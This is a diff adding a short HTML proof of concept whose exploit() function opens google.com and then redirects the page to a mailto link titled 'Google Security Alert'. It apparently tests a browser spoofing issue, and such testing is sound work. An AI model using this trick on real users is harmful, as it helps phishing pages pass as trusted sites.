@@ -1,0 +1,13 @@
+<!DOCTYPE html>
+<body>
+    <button onclick='exploit()'>Click</button>
+    <script>
+    function exploit() {
+        window.open('https://google.com', '');
+        setTimeout(() => {
+            location.href = 'mailto:test@example.com?subject=Google%20Security%20Alert';
+        }, 2000);
+    }
+    </script>
+</body>
+</html>
